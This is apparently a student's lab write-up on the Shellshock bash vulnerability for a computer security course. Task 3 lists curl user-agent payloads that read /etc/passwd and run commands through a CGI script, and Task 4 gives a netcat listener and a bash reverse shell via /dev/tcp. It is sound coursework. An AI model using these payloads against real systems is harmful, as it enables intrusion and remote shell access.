Task1: "/bin/bash_shellshock" echo $foo didn't print foo as environment but "declare -f foo" printed the definition of foo as a function due to the 
    vulnerability of bash_shellshock.
    "bin/bash" echo $foo printed foo as an environment variable which has been passed by the parent, but "declare -f foo" didn't print the definition 
    since it is not considered as a function since it is not considered asa  function. 
    
 Task2: -v prints out the variables and values from the http packet. 
        -A sets the HTTP_USER_AGENT variable
        -e sets the HTTP_REFERER variable
        -H "AAAAAA: BBBBBB" creates HTTP_AAAAAA and sets it to value BBBBBB
        
        the -H, -A and -e can be used to create arbitary variables. 
        
        
        ![Comp seclab2 2.2.1v](https://github.com/Rania-ME/csci-476-594-spring2021-private/blob/main/Comp%20seclab2%202.2.1v.JPG)
        
       ![Comp seclab2 2.2.2A](https://github.com/Rania-ME/csci-476-594-spring2021-private/blob/main/Comp%20seclab2%202.2.2A.JPG)
        
       ![Comp seclab2 2.2.3e](https://github.com/Rania-ME/csci-476-594-spring2021-private/blob/main/Comp%20seclab2%202.2.3e.JPG)
        
        ![Comp seclab2 2.2.4H](https://github.com/Rania-ME/csci-476-594-spring2021-private/blob/main/Comp%20seclab2%202.2.4H.JPG)
        
        
        
  Task3: curl -A "() { echo; cat /etc/passwd;}" http://localhost/cgi-bin/myprog2.cgi
         curl -A "() { echo; bin/id;}" http://localhost/cgi-bin/myprog2.cgi
         curl -A "() { echo; touch /tmp/fil;}" http://localhost/cgi-bin/myprog2.cgi
         curl -A "() { echo; rm /tmp/fil;}" http://localhost/cgi-bin/myprog2.cgi
         It is only a writable file. 
         
         
         ![Comp seclab2 3.1](https://github.com/Rania-ME/csci-476-594-spring2021-private/blob/main/Comp%20seclab2%203.1.JPG)
         
         
 Task4: "nc -lv 9090" on the attacker machine
         The attacker machine acts as a linstener till it finds traffic in the same port it is listening to. 
         "bin/bash -i > /dev/tcp/10.2.6/9090 0<&1 2>&1
         In real attacks we have to inject the code in the victims machin; yet, for demonstration purposes, we're running the command directly on the victims machine. 
Task5: The attack was possible with "bash" intstead of "bash_shellshock"
